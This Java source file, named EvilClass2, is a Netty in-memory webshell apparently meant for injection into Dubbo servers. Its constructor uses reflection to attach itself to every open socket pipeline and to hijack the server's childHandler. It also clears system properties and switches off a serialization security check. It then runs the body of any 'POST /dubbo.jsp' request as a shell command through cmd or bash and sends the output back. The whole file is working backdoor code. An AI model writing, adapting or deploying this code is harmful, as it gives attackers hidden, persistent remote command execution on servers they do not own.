package scanner.utils;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoop;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;
import sun.nio.ch.SelectionKeyImpl;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@ChannelHandler.Sharable
public class EvilClass2 extends ChannelDuplexHandler {
    private boolean started = false;
    private byte[] fullData = new byte[0];

    private static boolean isWindows() {
        String os = System.getProperty("os.name").toLowerCase();
        return os.contains("win");
    }

    public static byte[] concatenateByteArrays(byte[]... arrays) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try {
            for (byte[] array : arrays) {
                outputStream.write(array);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return outputStream.toByteArray();
    }

    public static boolean validateContentLength(byte[] request) {
        String requestStr = new String(request);
        String contentLengthPattern = "Content-Length: (\\d+)";
        Pattern pattern = Pattern.compile(contentLengthPattern);
        Matcher matcher = pattern.matcher(requestStr);

        if (matcher.find()) {
            int contentLength = Integer.parseInt(matcher.group(1));
            return (contentLength == request.length - requestStr.indexOf("\r\n\r\n") - 4);
        }

        return false;
    }

    public static String parseHttpRequest(byte[] request) {
        String requestStr = new String(request, StandardCharsets.UTF_8);
        int bodyStartIndex = requestStr.indexOf("\r\n\r\n") + 4;
        return requestStr.substring(bodyStartIndex);
    }

    public void run(ChannelHandlerContext ctx) {
        if (validateContentLength(this.fullData)) {
            String cmd = parseHttpRequest(this.fullData);
            this.fullData = new byte[0];
            started = false;
            try {
                String[] cmds;
                if (isWindows()) {
                    cmds = new String[]{"cmd", "/c", cmd};
                } else {
                    cmds = new String[]{"/bin/bash", "-c", cmd};
                }
                String execResult = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(execResult, CharsetUtil.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                ArrayList arrayList = new ArrayList();
                Method encodeMethod = HttpObjectEncoder.class.getDeclaredMethod("encode", new Class[]{ChannelHandlerContext.class, Object.class, List.class});
                encodeMethod.setAccessible(true);
                encodeMethod.invoke(new HttpResponseEncoder(), ctx, response, arrayList);
                for (Object b : arrayList) {
                    if (arrayList.indexOf(b) == arrayList.size() - 1) {
                        ctx.writeAndFlush(b).addListener(ChannelFutureListener.CLOSE);
                    } else {
                        ctx.writeAndFlush(b);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public EvilClass2(String a) throws Exception {

    }

    public EvilClass2() throws Exception {
        try {
            System.setProperties(null);
            System.setProperty("serialization.security.check", "false");
            try {
                Field field = Thread.class.getDeclaredField("target");
                field.setAccessible(true);
                Runnable r = (Runnable) field.get(Thread.currentThread());
                Class c = Class.forName("io.netty.util.concurrent.FastThreadLocalRunnable");
                Field field1 = c.getDeclaredField("runnable");
                field1.setAccessible(true);
                Object o = field1.get(r);
                Field field2 = Class.forName("io.netty.util.concurrent.SingleThreadEventExecutor$5").getDeclaredField("this$0");
                field2.setAccessible(true);
                NioEventLoop nioEventLoop = (NioEventLoop) field2.get(o);
                Field field3 = NioEventLoop.class.getDeclaredField("unwrappedSelector");
                field3.setAccessible(true);
                Object selector = field3.get(nioEventLoop);
                Field field4 = Class.forName("sun.nio.ch.EPollSelectorImpl").getDeclaredField("fdToKey");
                field4.setAccessible(true);
                HashMap map = (HashMap) field4.get(selector);
                for (Object i : map.keySet()) {
                    SelectionKeyImpl selectionKey = (SelectionKeyImpl) map.get(i);
                    ((NioSocketChannel) selectionKey.attachment()).pipeline().addLast(this);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean haveAdd = false;
    private Object tmp;


    @Override
    public void handlerAdded(ChannelHandlerContext ctx) throws Exception {
        super.handlerAdded(ctx);
        if (!haveAdd) {
            Object o = getField(ctx.pipeline().channel().parent().pipeline(), "head", DefaultChannelPipeline.class.getName());
            Object o1 = getField(o, "next", "io.netty.channel.AbstractChannelHandlerContext");
            Object o2 = getField(o1, "handler", "io.netty.channel.DefaultChannelHandlerContext");
            Field childHandler = Class.forName("io.netty.bootstrap.ServerBootstrap$ServerBootstrapAcceptor").getDeclaredField("childHandler");
            childHandler.setAccessible(true);
            Field mo = Field.class.getDeclaredField("modifiers");
            mo.setAccessible(true);
            mo.setInt(childHandler, childHandler.getModifiers() & ~Modifier.FINAL);
            tmp = childHandler.get(o2);
            childHandler.set(o2, this);
            haveAdd = true;
        } else {
            ctx.pipeline().addLast((ChannelInitializer) tmp);
        }
    }

    public static Object getField(Object obj, String name, String className) {
        try {
            Field field = Class.forName(className).getDeclaredField(name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        ByteBuf buf = ((ByteBuf) msg).copy();
        while (true) {
            if (buf.isReadable()) {
                byte[] req = new byte[buf.readableBytes()];
                buf.readBytes(req);
                if (!started && new String(req).startsWith("POST /dubbo.jsp")) {
                    fullData = concatenateByteArrays(fullData, req);
                    started = true;
                    run(ctx);
                    return;
                } else if (started) {
                    fullData = concatenateByteArrays(fullData, req);
                    run(ctx);
                    return;
                }
            } else {
                break;
            }
        }
        if (!started) {
            super.channelRead(ctx, msg);
        }
    }

    public static void main(String[] args) throws Exception {
        new EvilClass2();
    }
}
